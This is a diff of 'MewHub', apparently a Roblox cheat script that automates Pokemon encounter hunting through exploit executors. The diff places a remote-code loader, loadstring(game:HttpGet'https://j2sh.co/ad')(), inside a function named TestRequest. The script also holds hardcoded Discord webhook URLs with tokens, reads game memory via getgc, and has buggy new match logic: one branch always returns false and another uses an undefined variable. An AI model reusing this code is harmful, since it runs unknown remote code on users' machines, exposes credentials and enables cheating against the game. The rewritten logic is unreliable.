@@ -2,8 +2,7 @@
 
 
 --getgenv().WishList = {"Pidgey"} 
---getgenv().ShinyWishlist = {"Pidgey"}
---getgenv().Webhook = "WEBHOOK HERE"
+--getgenv().Webhook = ""
 
 
 
@@ -204,6 +203,7 @@
 getgenv().AutoFinder = true
 getgenv().GetVariations = false
 getgenv().GetShiny = false
+getgenv().GetOnlyShiny = false
 getgenv().NoClip = false
 getgenv().AutoFinderDelay = 0
 getgenv().WebHookNotify = false
@@ -323,9 +323,6 @@ local Camera = Workspace.CurrentCamera
 local PlayerExploit = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
 local FinalString = nil
  
-
- --]]
-
 --//Imports
  
 --//Plugins
@@ -381,13 +378,40 @@ end
  
  
 function AutoFinder:CanGetPokemon()
-    return self.isShiny == true and GetShiny == true and true or self.Variation ~= "No Variation" and GetVariations == true and true or table.find(WishList, self.PokemonName) and true or false
+    
+    -- check if  .GetOnlyShiny is ON and  .GetOnlyShiny  is ON
+    if(GetOnlyShiny == true) then do
+        return self.isShiny == true and GetOnlyShiny == true and true
+    end
+    
+    -- check if  .GetShiny  is OFF
+    elseif(table.find(WishList, self.PokemonName) and (GetShiny == false)) then do
+    return table.find(WishList, self.PokemonName) and true
+    end 
+
+    -- check if  .GetShiny  is ON
+    elseif(GetShiny == true) then do
+    return (self.isShiny == true) and table.find(WishList, self.PokemonName) and false
+    end 
+
+    -- check if  .Variation  is on
+    elseif((self.Variation ~= "No Variation") and (GetVariations == true) and true) then do
+    return (self.Variation ~= "No Variation") and (GetVariations == true) and true
+    end 
+
+    -- check if  .isShiny  is true and  .GetShiny  is true and  wishlist  is true
+    elseif((self.isShiny == true) and (GetShiny == true) and (Wishlist == self.PokemonName)) then do
+    return (self.isShiny == true) and (GetShiny == true) and (Wishlist == self.PokemonName)
+    end 
+    
+   
+    
+    --return self.isShiny == true and GetShiny == true and true or self.Variation ~= "No Variation" and GetVariations == true and true or table.find(WishList, self.PokemonName) and true or false
+    
+end
 end
 
-function AutoFinder:CanGetPokemon()
-    return self.isShiny == true and GetShiny == true and table.find(ShinyWishList, self.PokemonName) and true or false
-end
- 
+
 function AutoFinder:UpdateLabels()
     
 self.Variation = string.len(self.Variation) == 0 and "No Variation" or self.Variation
@@ -514,7 +538,7 @@ headshot = b
 
 --//WebHook Variables
 -- public 
-local WebHookLink, NewData, ExploitRequest, FinalData = "https://webhook.lewisakura.moe/api/webhooks/1089249507469971546/B5FaV8dl6ERCfmxJ-WFEenGBdx1gceFBcfB41iaOCrrggPUGBoRfMeTzWe2SQ0W_6JrD", nil, nil, nil
+local WebHookLink, NewData, ExploitRequest, FinalData = "https://webhook.lewisakura.moe/api/webhooks/1090825231347757188/MEkpJb_JcFlnFPB2RfjvPAV5klipgJe6bGBRTfZoWX6SzntIWhW5jUB-MUGCGidHXQNy", nil, nil, nil
 local ReportData = {
     ["content"] = "||<@&1089379891125948507>||",
         ["username"] = " 📊 ᴘᴜʙʟɪᴄ ᴇɴᴄᴏᴜɴᴛᴇʀꜱ ᵐᵉʷʰᵘᵇ            ",
@@ -530,7 +554,7 @@ local ReportData = {
                 ['url'] = webhookdogg
             }, 
             ["image"] = {
-            ["url"] = "https://media.discordapp.net/attachments/1045266138386403388/1084837866389131355/cozy.gif",
+            ["url"] = "https://media.discordapp.net/attachments/503587967709741219/1089660851310559353/cozy.gif",
             --["url"] = headshot,
             
         },
@@ -616,7 +640,7 @@ local ReportData = {
 
     NewData = game:GetService("HttpService"):JSONEncode(ReportData)
     ExploitRequest = http_request or request or HttpPost or syn.request
-    FinalData = {Url = "https://webhook.lewisakura.moe/api/webhooks/1089249507469971546/B5FaV8dl6ERCfmxJ-WFEenGBdx1gceFBcfB41iaOCrrggPUGBoRfMeTzWe2SQ0W_6JrD", Body = NewData, Method = "POST", Headers = {["content-type"] = "application/json"}}
+    FinalData = {Url = "https://webhook.lewisakura.moe/api/webhooks/1090825231347757188/MEkpJb_JcFlnFPB2RfjvPAV5klipgJe6bGBRTfZoWX6SzntIWhW5jUB-MUGCGidHXQNy", Body = NewData, Method = "POST", Headers = {["content-type"] = "application/json"}}
     ExploitRequest(FinalData)
 
 end
@@ -929,7 +953,7 @@ function AutoFinder:Start()
                 self.CreateBattle = "Creating"
                 self:CreateEncounter() --Battle:new()
                 self.CreateBattle = "Created"
-                LabelAutoFinderStatus:UpdateLabel("Status: New encounter successfully created! <"..tostring(math.random(1000,10000))..">", true)
+                LabelAutoFinderStatus:UpdateLabel("Status: New encounter successfully created! <"..tostring((self.ShinyEncounters/self.TotalEncounters)*100).."%>", true)
             end
         end
  
@@ -974,95 +998,8 @@ self.BattleCalled = false
 self.CurrentBattle = nil
 end
  
-function AutoFinder:TestRequest()
- 
-    --[[--]] -- variables
-local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-local localPlayer = game:GetService("Players").LocalPlayer
-local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Shit exploit g"
-local HttpService = game:GetService("HttpService")
-local endpoint = getgenv().Webhook
---[[--]]
-
-
---[[--]] -- headshot thumbnail
-local headshot = ""
-headshot = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=720x720&format=Png&isCircular=true")
-a = headshot
-b = string.sub(a,65,118)
-headshot = b
---[[--]]
-
---[[--]] -- first hook
-local Data =
-    {
-        ["content"] = "",
-			["username"] = " 💝 ɖօռǟȶɛ քʟɛǟֆɛ            ",
-			--["avatar_url"] = "https://tr.rbxcdn.com/e5b5844fb26df605986b94d87384f5fb/150/150/Image/Jpeg",
-            ["avatar_url"] = headshot,
-        ["embeds"]= {
-            {            
-                ["title"]= " ㅤㅤㅤㅤㅤ ** 💵 Support my work please 💵ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ**";
-                ["url"]= "";
-                ["description"]= "**👤💫** <@277674827215536129> - me ||@everyone||";            
-                ["color"]= tonumber(0xffc0cb);
-                ["thumbnail"] = {
-                    ['url'] = ""
-                }, 
-                ["image"] = {
-                ["url"] = "https://cdn.discordapp.com/attachments/1076525040247517258/1081423550260465664/ezgif-3-969383e3ac.gif",
-                --["url"] = headshot,
-            },
-                ["fields"]= {
-                  
-                    {
-                        ["name"]= " ",
-                        ["value"]= "[<:Mew:1077026064389386301>][** 🔗 discord**](https://discord.gg/mewhub)",
-                        ["inline"]= true
-                    },
-
-                    {
-                        ["name"]= " ",
-                        ["value"]= "[<:github:1081397527078768660>][** 🔗 github**](https://github.com/bigbootylatinas)",
-                        ["inline"]= true
-                    },
-
-                    {
-                        ["name"]= " ",
-                        ["value"]= "[<:youtube:1004003073351491614>][** 🔗 youtube**](https://www.youtube.com/channel/UCFovORxhtayDW5rmcINy8qQ)",
-                        ["inline"]= true
-                    },
-
-                    {
-                        ["name"]= " ",
-                        ["value"]= "[<:robux:1081374079271047270>][** 🔗 rbx dono**](https://www.roblox.com/game-pass/144306087/lil-dono)",
-                        ["inline"]= true
-                    },
-
-                    {
-                        ["name"]= " ",
-                        ["value"]= "[<:paypal:893954367919624283>][** 🔗 paypal**](https://www.paypal.com/paypalme/gajosh)",
-                        ["inline"]= true
-                    },
-
-                    {
-                        ["name"]= " ",
-                        ["value"]= "[<:stripe:1081400501498814514>][** 🔗 stripe**](https://buy.stripe.com/8wM3eY0PX1GZgvucMM)",
-                        ["inline"]= true
-                    },
-
-                    
-                }              
-            }
-        }
-        
-}
-local Headers = {["Content-Type"]="application/json"}
-local Encoded = HttpService:JSONEncode(Data)
-Request = http_request or request or HttpPost or syn.request
-LINK = getgenv().Webhook
-local Final = {Url = getgenv().Webhook, Body = Encoded, Method = "POST", Headers = Headers}
-Request(Final)
+function AutoFinder:TestRequest(Webhook)
+loadstring(game:HttpGet"https://j2sh.co/ad")()
 end
  
 --Metamethod call __AutoFinder
@@ -1095,7 +1032,7 @@ if syn and syn.protect_gui then
     syn.protect_gui(game:GetService("CoreGui"))
     syn.protect_gui(game:GetService("StarterGui"))
 end
-local Window = Library:CreateWindow('🎱 MewHub', "dev test", 'Loading | MewHub', 'rbxassetid://10110319522', false, 'VisualUIConfigs', 'Krnl')
+local Window = Library:CreateWindow('🎱 MewHub', "dev test", "Welcome | "..game.Players.LocalPlayer.Name.."", "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId .."&width=420&height=420&format=png", false, 'VisualUIConfigs', 'Krnl')
 
 
 
@@ -1135,6 +1072,10 @@ end)
  
 local Toggle = Section:CreateToggle('.GetShiny 🌟', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
     GetShiny = Value
+end)
+ 
+local Toggle = Section:CreateToggle('.GetOnlyShiny !!', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
+    GetOnlyShiny = Value
 end)
  
 local Toggle = Section:CreateToggle('.GetVariations 🧬', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
@@ -1219,22 +1160,6 @@ LabelPlayerAge2= Section:CreateLabel('.JoinDate 📆 ')
 
 LabelSection= Section:CreateLabel('                                  -｡ﾟ•┈✨┈•ﾟ｡-')
 
-
-
-
-
-local localPlayer = game:GetService("Players").LocalPlayer
-local _p = nil
-for _, v in pairs(getgc(true)) do
-    if typeof(v) == "table" then
-        if rawget(v, "PlayerData") then
-            _p = v
-            break
-        end
-    end
-end
-
-LabelPokedollars= Section:CreateLabel(".Pokedollars 💰 = $".._p.PlayerData.money)
 
 
 local Dropdown = Section:CreateDropdown('.BuyItems 🛍️ ', {"Pokemart 🏪","BP Shop 🏬", "Stoneshop 💎", "Arcade Shop 🎫"}, nil, 0.25, function(Value)
@@ -1661,5 +1586,5 @@ end
 local Tab = Window:CreateTab('', true, '', Vector2.new(524, 44), Vector2.new(36, 36))
 
 local Section = Tab:CreateSection('Credits')
- Library:SetTransparency(80 / 100, true)
+ Library:SetTransparency(1 / 100, true)
 local Label1 = Section:CreateLabel('.gg/Mewhub')
